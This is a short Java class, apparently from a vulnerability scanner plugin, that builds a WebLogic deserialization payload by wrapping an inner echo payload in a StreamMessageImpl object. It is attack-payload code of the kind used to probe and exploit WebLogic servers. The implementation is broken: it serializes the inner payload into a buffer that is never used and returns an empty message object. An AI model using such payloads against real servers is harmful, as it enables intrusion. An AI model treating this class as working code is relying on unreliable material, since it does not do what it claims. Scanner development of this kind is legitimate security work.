package com.gbw.scanner.plugins.scripts.weblogic.payload;

import com.gbw.scanner.utils.Serializer;
import weblogic.jms.common.StreamMessageImpl;

public class GBWStreamMessageImplEcho implements GBWEchoPayload<Object> {

    private GBWEchoPayload payload;

    public GBWStreamMessageImplEcho(GBWEchoPayload payload) {
        this.payload = payload;
    }

    public Object getObject(String version,Class echoClass) throws Exception {
        byte[] buf = Serializer.serialize(payload.getObject(version,echoClass));
        StreamMessageImpl obj = new StreamMessageImpl();

        return obj;
    }

    @Override
    public String getName() {
        return "GBWStreamMessageImplEcho";
    }


}
